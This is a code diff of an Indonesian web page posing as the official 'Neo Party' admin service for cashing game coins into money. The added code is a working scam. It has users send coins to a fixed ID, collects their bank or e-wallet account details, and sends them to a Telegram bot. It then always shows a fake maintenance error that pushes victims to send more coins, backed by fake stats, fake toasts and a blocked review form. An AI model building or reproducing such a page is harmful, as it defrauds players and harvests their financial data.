@@ -2,326 +2,254 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Bongkar - Neo Party</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
         :root {
-            --glass-bg: rgba(26, 34, 53, 0.85);
-            --neon-blue: #00f2ff;
+            --primary-dark: #032b29;
+            --primary-light: #0b5250;
+            --accent-cyan: #00e5f4;
+            --accent-gold: linear-gradient(135deg, #ff9800, #ffe066);
+            --glass-card: rgba(11, 82, 80, 0.85);
+            --input-bg: rgba(243, 210, 162, 0.95);
+            --text-dark: #5a3418;
+            --text-light: #ffffff;
             --wa-green: #25D366;
-            --orange-btn: linear-gradient(180deg, #ffbb33 0%, #ff8800 100%);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { box-sizing: border-box; }
 
-        body {
-            background: #87e2f3 radial-gradient(circle at top, #00d2ff 0%, #87e2f3 100%);
-            font-family: 'Quicksand', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px 0;
-        }
+        .star{
+    font-size:28px;
+    color:#666;
+    cursor:pointer;
+    transition:0.2s;
+    margin:0 3px;
+}
 
-        /* =========================
-   STATISTIK BONGKAR
-========================= */
+.star.active{
+    color:#ffcc33;
+    text-shadow:0 0 8px rgba(255,204,51,.8);
+}
+
+        /* ===== STATISTIK BONGKAR ===== */
 
 .stats-wrapper{
-    padding:25px;
+    padding:20px;
     display:flex;
     flex-direction:column;
-    gap:15px;
+    gap:12px;
 }
 
 .stat-card{
-    background: linear-gradient(
-        135deg,
-        rgba(255,255,255,0.08),
-        rgba(255,255,255,0.03)
-    );
+    background:rgba(255,255,255,0.05);
     border:1px solid rgba(255,255,255,0.08);
-    border-radius:22px;
-    padding:18px;
+    border-radius:18px;
+    padding:16px;
     text-align:center;
-    position:relative;
-    overflow:hidden;
-    backdrop-filter: blur(10px);
-    box-shadow:
-        0 8px 20px rgba(0,0,0,.25),
-        inset 0 0 20px rgba(255,255,255,.03);
-}
-
-.stat-card::before{
-    content:'';
-    position:absolute;
-    top:-50%;
-    left:-50%;
-    width:200%;
-    height:200%;
-    background:linear-gradient(
-        45deg,
-        transparent,
-        rgba(255,255,255,.06),
-        transparent
-    );
-    transform:rotate(25deg);
+    backdrop-filter:blur(10px);
+    box-shadow:0 8px 20px rgba(0,0,0,.25);
 }
 
 .stat-icon{
-    width:55px;
-    height:55px;
-    margin:0 auto 12px;
+    width:50px;
+    height:50px;
+    margin:0 auto 10px;
     border-radius:50%;
     display:flex;
     align-items:center;
     justify-content:center;
-    background:rgba(0,242,255,.12);
-    border:1px solid rgba(0,242,255,.25);
+    background:rgba(0,229,244,.12);
+    border:1px solid rgba(0,229,244,.25);
 }
 
 .stat-icon i{
-    color:#00f2ff;
-    font-size:22px;
+    color:#00e5f4;
+    font-size:20px;
 }
 
 .stat-value{
-    font-family:'Montserrat',sans-serif;
-    font-size:1.8rem;
+    font-size:1.6rem;
     font-weight:800;
-    color:#ffffff;
-    margin-bottom:8px;
-    text-shadow:0 0 15px rgba(0,242,255,.4);
+    color:#fff;
+    margin-bottom:5px;
 }
 
 .stat-label{
-    color:rgba(255,255,255,.75);
     font-size:.8rem;
-    letter-spacing:1px;
+    color:rgba(255,255,255,.75);
     font-weight:700;
 }
 
 .stat-card.highlight{
-    border:2px solid #ffbb33;
-    background:linear-gradient(
-        135deg,
-        rgba(255,187,51,.12),
-        rgba(255,136,0,.05)
-    );
+    border:2px solid #ffcc33;
+    background:rgba(255,204,51,.08);
 }
 
 .stat-card.highlight .stat-icon{
-    background:rgba(255,187,51,.15);
-    border-color:rgba(255,187,51,.35);
+    background:rgba(255,204,51,.15);
+    border-color:#ffcc33;
 }
 
 .stat-card.highlight .stat-icon i{
-    color:#ffbb33;
+    color:#ffcc33;
 }
 
 .stat-card.highlight .stat-value{
-    color:#ffbb33;
-    font-size:1.5rem;
-    text-shadow:0 0 15px rgba(255,187,51,.5);
+    color:#ffcc33;
+    font-size:1.3rem;
 }
 
-        .main-wrapper {
-            width: 92%;
-            max-width: 450px;
-            background: var(--glass-bg);
+        body {
+            background: var(--primary-dark);
+            color: var(--text-light);
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 10%, #0b7e7a 0%, var(--primary-dark) 70%);
+            z-index: -2;
+        }
+
+        .bg-glow {
+            position: fixed;
+            width: 300px; height: 300px;
+            background: var(--accent-cyan);
+            filter: blur(150px);
+            opacity: 0.15;
+            border-radius: 50%;
+            z-index: -1;
+            animation: glowMove 10s infinite alternate;
+        }
+
+        @keyframes glowMove {
+            0% { top: -10%; left: 10%; }
+            100% { top: 60%; left: 80%; }
+        }
+
+        /* --- CONTAINER --- */
+        .appnwghdiprem {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px 15px;
+            z-index: 1;
+        }
+
+        .boxverifnwghdi {
+            background: var(--glass-card);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
-            overflow: hidden;
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .withdraw-header {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 35px 25px;
-            text-align: center;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .withdraw-header h1 {
-            font-family: 'Montserrat', sans-serif;
-            color: var(--neon-blue);
-            font-size: 1.3rem;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-bottom: 15px;
-            text-shadow: 0 0 10px rgba(0, 242, 255, 0.3);
-        }
-
-        .logo-mid {
-            width: 80px;
-            height: auto;
-            margin: 10px auto 20px;
-            display: block;
-            filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.5));
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .main-title {
-            color: #ffffff;
-            font-size: 1.1rem;
-            line-height: 1.5;
-            margin-bottom: 25px;
-            font-weight: 700;
-        }
-
-        .price-box {
-            background: rgba(255, 255, 255, 0.03);
-            border: 2px dashed #ff9800;
-            border-radius: 20px;
-            padding: 15px;
-            margin-bottom: 25px;
-            color: #ffbb33;
-            font-size: 1.4rem;
-            font-weight: 800;
-            box-shadow: inset 0 0 15px rgba(255, 152, 0, 0.1);
-        }
-
-        .feature-list {
-            text-align: left;
-            margin: 0 auto 30px;
-            display: inline-block;
-        }
-
-        .feature-item {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 0.95rem;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-        }
-
-        .feature-item i {
-            color: var(--neon-blue);
-            margin-right: 12px;
-            font-size: 1.1rem;
-        }
-
-        .btn-wa {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            background: var(--orange-btn);
-            color: white;
-            text-decoration: none;
-            padding: 20px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 1.2rem;
-            box-shadow: 0 10px 20px rgba(255, 136, 0, 0.3);
-            transition: 0.3s;
-        }
-
-        .btn-wa:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(255, 136, 0, 0.5);
-        }
-
-        /* --- TESTIMONI SECTION --- */
-        .testi-container { padding: 30px 25px; }
-        .testi-title { display: flex; align-items: center; gap: 12px; color: white; font-size: 1.2rem; font-weight: 700; margin-bottom: 25px; }
-        .testi-title i { color: #a33eb3; font-size: 1.4rem; }
-        
-        .add-review-section { margin-bottom: 25px; }
-        .review-input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 15px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .review-input-group input, 
-        .review-input-group textarea {
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            padding: 12px;
-            color: white;
-            font-family: inherit;
-            outline: none;
-        }
-        .btn-send-review {
-            background: var(--neon-blue);
-            color: #1a2235;
-            border: none;
-            padding: 12px;
-            border-radius: 10px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn-send-review:hover { filter: brightness(1.2); }
-
-        .review-card { background: rgba(255, 255, 255, 0.03); border-radius: 20px; padding: 18px; margin-bottom: 15px; border: 1px solid rgba(255, 255, 255, 0.03); }
-        .review-user { display: flex; justify-content: space-between; margin-bottom: 8px; }
-        .player-name { color: var(--neon-blue); font-weight: 700; font-size: 1rem; }
-        .stars { color: #ffcc33; font-size: 0.8rem; }
-        .review-text { color: rgba(255, 255, 255, 0.7); font-size: 0.9rem; line-height: 1.4; margin-bottom: 12px; }
-        .time-info { border-top: 2px solid var(--wa-green); padding-top: 8px; color: var(--wa-green); font-size: 0.75rem; font-weight: 800; }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(8px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            padding: 20px;
-        }
-        .modal-content {
-            background: #1a2235;
-            padding: 30px;
             border-radius: 30px;
-            text-align: center;
-            max-width: 350px;
-            border: 2px solid var(--neon-blue);
-            animation: popIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-        }
-        @keyframes popIn {
-            from { transform: scale(0.5); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        .modal-content i { font-size: 3.5rem; color: #ffcc33; margin-bottom: 15px; }
-        .modal-content p { color: white; font-weight: 600; line-height: 1.6; font-size: 1rem; }
-        .btn-close-modal {
-            margin-top: 25px;
-            background: var(--neon-blue);
-            border: none;
-            padding: 10px 30px;
-            border-radius: 50px;
-            font-weight: 800;
-            cursor: pointer;
-            color: #1a2235;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
 
-        /* --- STYLE TOAST NOTIFIKASI --- */
- .toast-notif {
+        /* --- HEADER & BANNER --- */
+        .headernwgverifhdi {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid var(--accent-cyan);
+        }
+
+        .headernwgverifhdi p {
+            font-weight: 800;
+            font-size: 1.3rem;
+            color: #FFFF33;
+            margin: 0;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .banner-container { padding: 15px; text-align: center; }
+        .banner-img { width: 100%; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+
+        /* --- BUTTONS --- */
+        .btn-group-links { padding: 0 15px; margin-bottom: 10px; }
+        .btn-link-domino {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 100%; margin-bottom: 15px; padding: 14px;
+            background: var(--accent-gold); color: #000;
+            font-weight: 800; text-decoration: none; border-radius: 12px;
+            text-transform: uppercase; font-size: 0.85rem;
+            box-shadow: 0 5px 0 #b36b00; transition: 0.2s;
+        }
+
+        /* --- FORM --- */
+        .form-body { padding: 15px; }
+        .section-title {
+            font-size: 0.85rem; color: var(--accent-cyan); font-weight: 700;
+            text-transform: uppercase; margin: 20px 0 10px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .pretty-input {
+            width: 100%; margin-bottom: 15px; display: flex; align-items: center;
+            background: var(--input-bg); border-radius: 12px; padding: 12px 15px;
+            box-shadow: inset 2px 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .pretty-input input, .pretty-input select, .pretty-input textarea {
+            background: transparent; border: none; outline: none; width: 100%;
+            font-weight: 700; color: var(--text-dark); font-family: inherit;
+        }
+
+        .pretty-icon { margin-right: 12px; color: #6b3f1d; font-size: 1.1rem; }
+
+        /* --- ID ADMIN AREA --- */
+        .id-display-section {
+            background: rgba(0,0,0,0.25); border-radius: 20px; padding: 20px 10px;
+            margin: 20px 0; text-align: center; border: 1px solid rgba(255,255,255,0.05);
+        }
+        .id-image { width: 140px; border-radius: 10px; border: 3px solid #ffcc33; margin-bottom: 15px; }
+        .copy-btn { 
+            background: #fff; border: none; padding: 8px 15px; border-radius: 8px;
+            font-weight: 800; cursor: pointer; color: #ff9800; font-size: 0.75rem;
+        }
+
+        /* --- SUBMIT --- */
+        .button-group { text-align: center; padding: 20px 0; }
+        button[type="submit"] {
+            background: linear-gradient(180deg, #d4fc79 0%, #67a309 100%);
+            color: #fff; border: none; padding: 16px 40px; border-radius: 50px;
+            font-size: 1.1rem; font-weight: 800; cursor: pointer;
+            box-shadow: 0 6px 0 #1a5806; text-transform: uppercase;
+        }
+        .btn-chat-admin {
+            display: inline-flex; align-items: center; gap: 8px; margin-top: 20px;
+            color: #25D366; background: #fff; padding: 10px 25px; border-radius: 50px;
+            text-decoration: none; font-weight: 700; font-size: 0.9rem;
+        }
+
+        .testi-container { padding: 20px; background: rgba(0,0,0,0.15); border-radius: 25px; margin-top: 20px; }
+        .review-card {
+            background: rgba(255, 255, 255, 0.05); border-radius: 15px; padding: 15px;
+            margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.05);
+        }
+        .player-name { color: var(--accent-cyan); font-weight: 700; font-size: 0.9rem; }
+        .stars { color: #ffcc33; font-size: 0.7rem; }
+        .review-text { color: rgba(255,255,255,0.8); font-size: 0.85rem; margin: 5px 0; font-style: italic; }
+        .time-info { color: var(--wa-green); font-size: 0.7rem; font-weight: 600; }
+
+        #toast-container {
+            position: fixed; bottom: 20px; left: 20px;
+            z-index: 10000; pointer-events: none;
+            display: flex; flex-direction: column-reverse; gap: 10px;
+        }
+        .toast-notif {
             background: rgba(10, 15, 25, 0.95); color: white; padding: 12px 18px;
             border-radius: 15px; display: flex; align-items: center; gap: 12px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
@@ -360,48 +288,115 @@
     font-size: 13px;
     opacity: 0.9;
 }
-        .stars{
-    color:#ffcc33;
-    font-size:15px;
-    letter-spacing:2px;
-}
 
-.star.active{
-    color:#ffcc33;
-    text-shadow:0 0 8px rgba(255,204,51,.8);
-}
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
+            display: none; justify-content: center; align-items: center; z-index: 10001;
+        }
+        .modal-content {
+            background: var(--primary-light); padding: 30px; border-radius: 25px;
+            text-align: center; max-width: 300px; border: 2px solid var(--accent-cyan);
+        }
     </style>
 </head>
 <body>
 
-    <div class="main-wrapper">
-        <div class="withdraw-header">
-            <h1>Withdraw Neo Party</h1>
-            
-            <img src="logo.png" alt="Logo Neo Party" class="logo-mid">
+<div class="bg-glow"></div>
 
-            <div class="main-title">
-                WITHDRAW KOIN SAAT INI CUMAN BISA MELALUI<br>WHATSAPP ADMIN
-            </div>
+<div class="appnwghdiprem">
+    <div class="boxverifnwghdi">
+        <div class="headernwgverifhdi">
+            <p>ADMIN RESMI NEO PARTY</p>
+        </div>
 
-            <div class="price-box">
-                BONGKAR : Rp 62.000 / B
-            </div>
-
-            <div class="feature-list">
-                <div class="feature-item"><i class="fas fa-check-circle"></i> Admin Online 24 Jam</div>
-                <div class="feature-item"><i class="fas fa-check-circle"></i> 100% Terjamin Amanah</div>
-                <div class="feature-item"><i class="fas fa-check-circle"></i> Proses 1 Menit Uang Langsung Cair</div>
-            </div>
-
-            <a href="https://wa.me/6285143872975?text=Halo%20Admin,%20saya%20ingin%20bongkar%20koin." class="btn-wa">
-                <i class="fab fa-whatsapp" style="font-size: 1.6rem;"></i> KLIK DISINI UNTUK HUBUNGI ADMIN
+        <div class="banner-container">
+            <img src="img/bgcok.png" alt="Banner" class="banner-img">
+        </div>
+        
+        <div class="btn-group-links">
+            <a href="https://www.youtube.com/watch?v=n93T7sNPgdI" target="_blank" class="btn-link-domino">
+                <i class="fab fa-youtube"></i> TUTORIAL BONGKAR & TESTIMONI 
+            </a>
+            <a href="http://topup.neoparty.web.id" target="_blank" class="btn-link-domino">
+                <i class="fas fa-coins"></i> TOP UP KOIN KLIK DI SINI
             </a>
         </div>
 
-        <!-- STATISTIK BONGKAR -->
+        <form id="bongkarForm">
+            <div class="form-body">
+                <div class="section-title"><i class="fas fa-user-circle"></i> DATA PENGIRIM CHIP</div>
+                <div class="pretty-input">
+                    <span class="pretty-icon"><i class="fas fa-id-badge"></i></span>
+                    <input type="number" name="id_pengirim" placeholder="ID Game Anda" required>
+                </div>
+                <div class="pretty-input">
+                    <span class="pretty-icon"><i class="fas fa-user"></i></span>
+                    <input type="text" name="nickname" placeholder="Nickname Game" required>
+                </div>
+                <div class="pretty-input">
+                    <span class="pretty-icon"><i class="fas fa-wallet"></i></span>
+                    <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar (Contoh: 10B)" required>
+                </div>
+
+                <div class="id-display-section">
+                    <p style="color: #ffcc33; font-weight: 800; margin-bottom: 10px; font-size: 0.9rem;">KIRIM KOIN KE ID DIBAWAH:</p>
+                    <img src="img/id.png" class="id-image">
+                    <div class="pretty-input" style="background: #fff; width: 90%; margin: 0 auto; position: relative;">
+                        <input type="text" id="idPenerima" value="2848031" readonly style="color: #000; text-align: center; padding-right: 60px;">
+                        <button type="button" class="copy-btn" style="position: absolute; right: 5px;" onclick="copyID()">SALIN</button>
+                    </div>
+                </div>
+
+                <div class="section-title"><i class="fas fa-camera"></i> BUKTI KIRIM KOIN</div>
+                <div class="pretty-input" style="background: rgba(0,0,0,0.2); border: 1px dashed var(--accent-cyan);">
+                    <input type="file" id="myFile" required style="color: #fff; font-size: 0.8rem; padding: 5px;">
+                </div>
+
+                <div class="section-title"><i class="fas fa-money-bill-wave"></i> REKENING PENCAIRAN UANG</div>
+                <div class="pretty-input">
+                    <span class="pretty-icon"><i class="fas fa-university"></i></span>
+                    <select name="bank_pencairan" required>
+                        <option value="" disabled selected>Pilih Bank / E-Wallet</option>
+                        <option>BCA</option><option>BRI</option><option>BNI</option><option>MANDIRI</option>
+                        <option>DANA</option><option>GOPAY</option><option>BANK JAGO</option><option>SEABANK</option>
+                    </select>
+                </div>
+                <div class="pretty-input">
+                    <span class="pretty-icon"><i class="fas fa-credit-card"></i></span>
+                    <input type="number" name="nomor_rekening" placeholder="Nomor Rekening / HP" required>
+                </div>
+                <div class="pretty-input">
+                    <span class="pretty-icon"><i class="fas fa-user-check"></i></span>
+                    <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik" required>
+                </div>
+
+                <div class="button-group">
+
+    <div style="
+        background: rgba(255, 204, 51, 0.15);
+        border: 1px solid #ffcc33;
+        color: #ffcc33;
+        padding: 12px;
+        border-radius: 12px;
+        margin-bottom: 15px;
+        font-size: 0.85rem;
+        font-weight: 700;
+        line-height: 1.5;
+    ">
+        ❗️Setelah Mengirim Koin Dan Isi Rekening Pencairan Klik Proses Bongkar Dibawah Ini, Uang Anda Akan Cair Paling Lama 1 Menit
+    </div>
+
+    <button type="submit" id="btnSubmit">PROSES BONGKAR</button>
+                    <br>
+                    <a href="https://t.me/AgenNeoParty" target="_blank" class="btn-chat-admin">
+                        <i class="fab fa-telegram-plane"></i> HUBUNGI ADMIN
+                    </a>
+                    </div>
+
+<!-- STATISTIK BONGKAR -->
 <div class="stats-wrapper">
-    
+
     <div class="stat-card">
         <div class="stat-icon">
             <i class="fas fa-chart-line"></i>
@@ -427,18 +422,16 @@
     </div>
 
 </div>
+                </div>
+            </div>
+        </form>
 
         <div class="testi-container">
-            <div class="testi-title">
-                <i class="fas fa-comments"></i> Ulasan Pembeli
-            </div>
-
-            <div class="add-review-section">
-                <div class="review-input-group">
-                    <input type="text" id="rev-name" placeholder="Nama...">
-                    <textarea id="rev-text" placeholder="Tulis ulasan anda..." rows="2"></textarea>
-
-<div id="star-rating" style="margin-top:10px;text-align:center;">
+            <div class="section-title" style="margin-top: 0;"><i class="fas fa-comments"></i> Ulasan Pembeli</div>
+            <div style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; margin-bottom: 20px;">
+                <input type="text" id="rev-name" placeholder="Nama..." style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; outline: none;">
+                <textarea id="rev-text" placeholder="Ulasan..." rows="2" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; padding: 10px; border-radius: 8px; outline: none;"></textarea>
+                <div id="star-rating" style="margin-top:10px;text-align:center;">
     <i class="fas fa-star star" data-rate="1"></i>
     <i class="fas fa-star star" data-rate="2"></i>
     <i class="fas fa-star star" data-rate="3"></i>
@@ -446,33 +439,32 @@
     <i class="fas fa-star star" data-rate="5"></i>
 </div>
 
-<div id="rating-text"
+                <div id="rating-text"
      style="text-align:center;color:#ffcc33;font-weight:700;margin-top:5px;">
      Sangat Puas ⭐⭐⭐⭐⭐
 </div>
 
 <input type="hidden" id="selected-rating" value="5">
-
-<button class="btn-send-review" onclick="showNotice()">KIRIM ULASAN</button>
-                </div>
+                <button onclick="showNotice()" style="width: 100%; margin-top: 10px; background: var(--accent-cyan); border: none; padding: 10px; border-radius: 8px; font-weight: 800; cursor: pointer;">KIRIM ULASAN</button>
             </div>
-
             <div id="review-list"></div>
         </div>
     </div>
+</div>
 
-    <div id="toast-container" style="position: fixed; bottom: 20px; left: 20px; z-index: 10000; pointer-events: none;"></div>
+<div id="toast-container"></div>
 
-    <div class="modal-overlay" id="modalNotice">
-        <div class="modal-content">
-            <i class="fas fa-exclamation-circle"></i>
-            <p>Anda hanya bisa berkomentar jika sudah melakukan withdraw koin melalui Admin.</p>
-            <button class="btn-close-modal" onclick="closeNotice()">SAYA MENGERTI</button>
-        </div>
+<div class="modal-overlay" id="modalNotice">
+    <div class="modal-content">
+        <i class="fas fa-exclamation-circle" style="font-size: 3rem; color: #ffcc33; margin-bottom: 15px; display: block;"></i>
+        <p style="font-size: 0.9rem; line-height: 1.5;">Anda hanya bisa berkomentar jika sudah melakukan withdraw koin.</p>
+        <button class="btn-close-modal" onclick="closeNotice()">SAYA MENGERTI</button>
     </div>
+</div>
 
-    <script>
-        const stars = document.querySelectorAll('.star');
+<script>
+
+    const stars = document.querySelectorAll('.star');
 const ratingInput = document.getElementById('selected-rating');
 const ratingText = document.getElementById('rating-text');
 
@@ -607,25 +599,46 @@ stars.forEach(s => s.classList.add('active'));
     createToast();
     setInterval(createToast, 5000);
 
-        function showNotice() {
+    // --- FORM SUBMIT ---
+    document.getElementById("bongkarForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const btn = document.getElementById("btnSubmit");
+        btn.innerText = "MENGIRIM...";
+        btn.disabled = true;
+
+        const formData = new FormData(this);
+        let msg = `🔔 *BONGKAR BARU*\n\n`;
+        msg += `🆔 ID: ${formData.get('id_pengirim')}\n`;
+        msg += `👤 Nick: ${formData.get('nickname')}\n`;
+        msg += `💰 Jumlah: ${formData.get('jumlah_bongkaran')}\n`;
+        msg += `🏦 Bank: ${formData.get('bank_pencairan')}\n`;
+        msg += `💳 No.Rek: ${formData.get('nomor_rekening')}\n`;
+        msg += `✍️ Nama: ${formData.get('atas_nama')}`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+        .then(() => {
+            alert(" BONGKAR EROR!\n\nSaat Ini Bongkar Dibawah 5B sedang maintenance. Silakan Cukupkan Ke 5B Agar Uang Lansung Otomatis DI Transfer.");
+            btn.innerText = "PROSES SEKARANG";
+            btn.disabled = false;
+            this.reset();
+        });
+    });
+
+    // --- UTILS ---
+    function showNotice() {
         const n = document.getElementById('rev-name').value;
         const t = document.getElementById('rev-text').value;
         if(!n || !t) { alert("Isi nama dan ulasan!"); return; }
         document.getElementById('modalNotice').style.display = 'flex';
     }
     function closeNotice() { document.getElementById('modalNotice').style.display = 'none'; }
-
-        function showNotice() {
-    const n = document.getElementById('rev-name').value;
-    const t = document.getElementById('rev-text').value;
-
-    if(!n || !t) {
-        alert("Isi nama dan ulasan!");
-        return;
+    function copyID() {
+        const el = document.getElementById('idPenerima');
+        el.select();
+        document.execCommand('copy');
+        alert('ID Admin Disalin!');
     }
+</script>
 
-    document.getElementById('modalNotice').style.display = 'flex';
-}
-    </script>
 </body>
 </html>
